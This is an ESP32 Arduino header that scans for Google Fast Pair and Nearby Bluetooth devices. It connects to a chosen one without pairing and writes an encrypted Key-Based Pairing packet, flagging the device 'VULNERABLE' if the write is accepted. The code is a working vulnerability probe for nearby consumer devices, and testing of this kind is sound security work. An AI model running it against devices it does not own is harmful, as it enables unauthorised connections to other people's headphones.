#ifndef BLE_MANAGER_H
#define BLE_MANAGER_H

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <vector>
#include <algorithm> 
#include "mbedtls/aes.h"

#define MAX_SCANNED_DEVICES 50
#define SCAN_STACK_SIZE 8192 

struct ScannedDevice {
    NimBLEAddress rawAddr; 
    String address;
    uint8_t addrType;     
    String name;
    bool isFastPair;      
    bool isVulnerable;    
    int rssi;
    int lastLogRssi;       
    uint32_t lastSeen;     
    String modelId;        
};

class BleManager {
private:
    NimBLEScan* pScan = nullptr;
    NimBLEClient* pClient = nullptr;
    std::vector<ScannedDevice> discoveredDevices;
    SemaphoreHandle_t listLock;
    
    NimBLEUUID uuidFastPair; 
    NimBLEUUID uuidNearby;   
    NimBLEUUID kbpUUID;      
    
    volatile bool _isScanning = false;
    volatile int vulnerableCount = 0;
    
    volatile bool notificationReceived = false;

    // --- DEBUG CALLBACKS ---
    class MyClientCallbacks : public NimBLEClientCallbacks {
        void onConnect(NimBLEClient* pClient) override {
            Serial.printf(">>> DEBUG: Callback -> Connected! Peer: %s\n", pClient->getPeerAddress().toString().c_str());
        }

        void onDisconnect(NimBLEClient* pClient, int reason) override {
            Serial.printf(">>> DEBUG: Callback -> Disconnected! (Reason: %d) Peer: %s\n", reason, pClient->getPeerAddress().toString().c_str());
        }
        
        bool onConnParamsUpdateRequest(NimBLEClient* pClient, const ble_gap_upd_params* params) override {
            Serial.printf(">>> DEBUG: Params Update Request: Min=%d, Max=%d, Lat=%d, TO=%d\n", 
                params->itvl_min, params->itvl_max, params->latency, params->supervision_timeout);
            return true; // Auto-accept
        }
    };

    static void scanTask(void* param) {
        BleManager* ble = (BleManager*)param;
        if (ble->pScan->start(0, false)) {
             // Started
        } else {
             Serial.println(">> Scan start failed.");
        }
        
        while (ble->pScan != nullptr && ble->pScan->isScanning()) {
            vTaskDelay(100 / portTICK_PERIOD_MS);
        }
        ble->_isScanning = false;
        vTaskDelete(NULL);
    }

    class MyScanCallbacks : public NimBLEScanCallbacks {
        BleManager* parent;
    public:
        MyScanCallbacks(BleManager* p) : parent(p) {}
        
        String resolveManufacturer(const std::string& data) {
            if (data.length() < 2) return "";
            uint16_t id = ((uint8_t)data[1] << 8) | (uint8_t)data[0];
            switch(id) {
                case 0x004C: return "Apple Device";
                case 0x00E0: return "Google Device";
                case 0x0075: return "Samsung Device";
                case 0x0006: return "Microsoft Device";
                case 0x05AC: return "Sony Device";
                default:     return "Mfg: 0x" + String(id, HEX);
            }
        }

        String parseModelId(const std::string& data) {
            if (data.length() >= 4 && data[0] == 0x00) {
                uint32_t modelId = ((uint8_t)data[1] << 16) | ((uint8_t)data[2] << 8) | (uint8_t)data[3];
                char buf[7];
                sprintf(buf, "%06X", modelId);
                return String(buf);
            }
            return "";
        }

        void onResult(const NimBLEAdvertisedDevice* dev) override {
            bool isFP = dev->isAdvertisingService(parent->uuidFastPair);
            bool isNearby = dev->isAdvertisingService(parent->uuidNearby);
            String fpModelId = "";

            if (dev->haveServiceData()) {
                std::string fpData = dev->getServiceData(parent->uuidFastPair);
                if (fpData.length() > 0) {
                    isFP = true;
                    fpModelId = parseModelId(fpData);
                }
                if (dev->getServiceData(parent->uuidNearby).length() > 0) isNearby = true;
            }

            if (isFP || isNearby) {
                String detectedName = String(dev->getName().c_str());
                String fallbackName = "";
                
                if (detectedName.isEmpty()) {
                    if (dev->haveManufacturerData()) {
                        fallbackName = resolveManufacturer(dev->getManufacturerData());
                    }
                    if (fallbackName.isEmpty()) {
                         if (!fpModelId.isEmpty()) fallbackName = "ID: " + fpModelId;
                         else if (isFP) fallbackName = "Fast Pair Device";
                         else if (isNearby) fallbackName = "Nearby Device";
                         else fallbackName = "Unknown";
                    }
                }

                if (xSemaphoreTake(parent->listLock, 5 / portTICK_PERIOD_MS) == pdTRUE) {
                    NimBLEAddress currentAddr = dev->getAddress();
                    bool found = false;

                    for(auto& d : parent->discoveredDevices) {
                        // --- DEDUPLICATION LOGIC ---
                        bool match = (d.rawAddr == currentAddr); // 1. Check exact MAC
                        
                        // 2. Check Name Match (if names exist)
                        if (!match && !detectedName.isEmpty() && !d.name.isEmpty()) {
                            if (d.name == detectedName) match = true;
                        }

                        // 3. Check Model ID Match (Best for Fast Pair rotation)
                        if (!match && !fpModelId.isEmpty() && !d.modelId.isEmpty()) {
                            if (d.modelId == fpModelId) match = true;
                        }

                        if(match) { 
                            // FOUND! Update existing entry with LATEST details.
                            // This ensures we always try to connect to the active MAC.
                            d.rawAddr = currentAddr; 
                            d.address = String(currentAddr.toString().c_str());
                            d.rssi = dev->getRSSI();
                            d.lastSeen = millis();
                            d.addrType = dev->getAddressType(); 
                            
                            if (!fpModelId.isEmpty() && d.modelId.isEmpty()) d.modelId = fpModelId;
                            if (detectedName.length() > 0 && d.name != detectedName) d.name = detectedName;
                            
                            found = true;
                            break; 
                        }
                    }
                    
                    if (!found) {
                        if (parent->discoveredDevices.size() >= MAX_SCANNED_DEVICES) {
                             parent->discoveredDevices.erase(parent->discoveredDevices.begin());
                        }

                        ScannedDevice d;
                        d.rawAddr = currentAddr;
                        d.address = String(currentAddr.toString().c_str());
                        d.addrType = dev->getAddressType();
                        d.name = !detectedName.isEmpty() ? detectedName : fallbackName;
                        d.isFastPair = isFP;
                        d.isVulnerable = false;
                        d.rssi = dev->getRSSI();
                        d.lastLogRssi = d.rssi;
                        d.lastSeen = millis();
                        d.modelId = fpModelId; 
                        
                        parent->discoveredDevices.push_back(d);
                    }
                    xSemaphoreGive(parent->listLock);
                }
            }
        }
    };

    void encryptPacketWithKey(uint8_t* input, uint8_t* output, uint8_t* key) {
        mbedtls_aes_context aes;
        mbedtls_aes_init(&aes);
        mbedtls_aes_setkey_enc(&aes, key, 128);
        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, input, output);
        mbedtls_aes_free(&aes);
    }

    uint8_t parseHexNibble(char c) {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return 0;
    }

public:
    BleManager() {
        uuidFastPair = NimBLEUUID((uint16_t)0xFE2C);
        uuidNearby = NimBLEUUID((uint16_t)0xFEF3);
        kbpUUID = NimBLEUUID("fe2c1234-8366-4814-8eb0-01de32100bea");
    }

    void init() {
        listLock = xSemaphoreCreateMutex();
        
        NimBLEDevice::init("ESP32-Whisper");
        // Removed setPower to prevent potential brownouts/stability issues
        // NimBLEDevice::setPower(ESP_PWR_LVL_P9); 
        
        pScan = NimBLEDevice::getScan();
        pScan->setScanCallbacks(new MyScanCallbacks(this), true); 
        pScan->setActiveScan(true); 
        pScan->setInterval(100); 
        pScan->setWindow(60); 
        pScan->setMaxResults(0); 
    }

    void startScan() {
        if (_isScanning) return;
        pScan->clearResults(); 
        _isScanning = true;
        xTaskCreate(scanTask, "scanTask", SCAN_STACK_SIZE, this, 1, NULL);
    }

    void stopScan() {
        if(pScan->isScanning()) {
            pScan->stop(); 
            Serial.println(">> Stop Requested.");
        }
    }

    bool isScanning() { return pScan->isScanning() || _isScanning; }
    int getVulnCount() { return vulnerableCount; }
    void lockList() { xSemaphoreTake(listLock, portMAX_DELAY); }
    void unlockList() { xSemaphoreGive(listLock); }
    std::vector<ScannedDevice>& getDevicesUnsafe() { return discoveredDevices; }

    bool testDevice(int index, String expectedName) {
        Serial.println("\n--- START TEST ---");
        
        // 1. HARD STOP SCAN (Keep existing logic here...)
        bool wasScanning = isScanning();
        if(wasScanning) stopScan();

        bool success = false;
        // Start Retry Loop
        for(int attempt = 0; attempt < 5; attempt++) { 
            if(attempt > 0) {
                startScan(); 
                delay(5000); 
                stopScan();
                delay(1000); 
            }
            ScannedDevice dev;
            bool found = false;

            // --- NEW SAFE LOOKUP LOGIC ---
            lockList();
            
            // A. Try the index first (Fastest)
            if(index >= 0 && index < discoveredDevices.size()) {
                if (discoveredDevices[index].name == expectedName) {
                    dev = discoveredDevices[index]; // Copy fresh data (including new MAC)
                    found = true;
                }
            }

            // B. If index failed (list shifted), search by Name
            if (!found) {
                Serial.println("DEBUG: Index mismatch, searching by name...");
                for (const auto& d : discoveredDevices) {
                    if (d.name == expectedName) {
                        dev = d;
                        found = true;
                        break;
                    }
                }
            }
            unlockList();
            // -----------------------------

            if (!found) {
                Serial.println("Error: Device not found (List changed?)");
                continue;
            }

            Serial.printf("DEBUG: Targeting Fresh MAC: %s\n", dev.rawAddr.toString().c_str());

            // Cleanup previous client
            if(pClient != nullptr) {
                NimBLEDevice::deleteClient(pClient);
                pClient = nullptr;
            }

            // USE RAW ADDRESS DIRECTLY (Preserves Type and exact MAC bytes)
            NimBLEAddress targetAddr = dev.rawAddr;

            pClient = NimBLEDevice::createClient();
            if(!pClient) {
                Serial.println("DEBUG: Failed to create client (Heap?)");
                if(wasScanning) startScan();
                return false;
            }
            pClient->setClientCallbacks(new MyClientCallbacks(), true);
            pClient->setConnectTimeout(8); // 8 seconds

            Serial.println("Connecting...");
            bool connected = false;
            int retryDelay = 1000;
            
            for(int i=0; i<3; i++) {
                Serial.printf("DEBUG: Initiating connection to %s...\n", targetAddr.toString().c_str());
                unsigned long startConn = millis();

                // Attempt connect (false = do NOT delete attributes, faster retry)
                bool attempt = pClient->connect(targetAddr, false);
                
                // Race condition check: Sometimes connect() returns false but IS connected
                if (!attempt && pClient->isConnected()) {
                    Serial.println("DEBUG: connect() returned false but isConnected() is true!");
                    attempt = true;
                }

                if(attempt) { 
                    Serial.printf("DEBUG: Connection Success (Time: %lu ms)\n", millis() - startConn);
                    connected = true;
                    break;
                } else {
                    Serial.printf("DEBUG: Connect Attempt %d Failed (Time: %lu ms). RSSI: %d\n", 
                        i+1, millis() - startConn, pClient->getRssi());
                    
                    // Soft reset of client state
                    pClient->disconnect(); 
                    delay(retryDelay);
                    retryDelay += 500; 
                }
            }

            if(!connected) {
                Serial.println("Connection Failed.");
                if(pClient) {
                    NimBLEDevice::deleteClient(pClient);
                    pClient = nullptr;
                }
                if(wasScanning) startScan();
                return false;
            }

            Serial.println("Connected! (Validating...)");
            
            // 5. MTU
            if(pClient->exchangeMTU()) {
                Serial.println("DEBUG: MTU Exchange Requested");
            }
            delay(300); 

            bool success = false;
            notificationReceived = false;

            NimBLERemoteService* pSvc = pClient->getService(uuidFastPair);
            if(pSvc) {
                NimBLERemoteCharacteristic* pChar = pSvc->getCharacteristic(kbpUUID);
                if(pChar) {
                    Serial.println("Applying Quirk Delay (250ms)...");
                    delay(250); 

                    if(pChar->canNotify()) {
                        pChar->subscribe(true, [this](NimBLERemoteCharacteristic* pChar, uint8_t* pData, size_t length, bool isNotify){
                            this->notificationReceived = true;
                            Serial.printf("DEBUG: Notification RX Len: %d\n", length);
                        });
                    }

                    // 6. ENCRYPTION & WRITE
                    uint8_t raw[16];
                    raw[0] = 0x00; 
                    raw[1] = 0x11; 
                    
                    String addrStr = dev.address;
                    int byteIdx = 0;
                    for (int i = 0; i < addrStr.length() && byteIdx < 6; i++) {
                        char c = addrStr[i];
                        if (c == ':') continue;
                        uint8_t val = parseHexNibble(c) << 4;
                        if (i + 1 < addrStr.length()) val |= parseHexNibble(addrStr[++i]);
                        raw[2 + byteIdx] = val;
                        byteIdx++;
                    }
                    
                    uint8_t salt[8];
                    for(int i=0; i<8; i++) {
                        salt[i] = (uint8_t)random(0xFF);
                        raw[8+i] = salt[i];
                    }

                    uint8_t key[16] = {0}; 
                    memcpy(key, salt, 8); 

                    uint8_t encrypted[16];
                    encryptPacketWithKey(raw, encrypted, key);
                    
                    if(pChar->writeValue(encrypted, 16, true)) {
                        Serial.println("Write Accepted -> VULNERABLE");
                        success = true; 
                    } else {
                        Serial.println("Write Failed");
                    }

                    if (success) {
                        unsigned long startWait = millis();
                        while(millis() - startWait < 2000) { 
                            if(notificationReceived) {
                                Serial.println("Exploit Confirmed (Notification Received)!");
                                break;
                            }
                            delay(10); 
                        }
                    }

                    if (success) {
                        lockList();
                        for(auto& d : discoveredDevices) {
                            if(d.rawAddr == dev.rawAddr) {
                                d.isVulnerable = true;
                                vulnerableCount++;
                                break;
                            }
                        }
                        unlockList();
                    }
                } else Serial.println("No KBP Char");
            } else Serial.println("No FP Service");
            
            if (success) return true;
            if (pClient && pClient->isConnected()) break; 
            if (pClient) pClient->disconnect();
        } 

        Serial.println("Disconnecting...");
        if(pClient) {
            pClient->disconnect();
            NimBLEDevice::deleteClient(pClient);
            pClient = nullptr;
        }
        
        if(wasScanning) startScan(); 
        Serial.println("--- TEST END ---\n");
        return success;
    }
};

#endif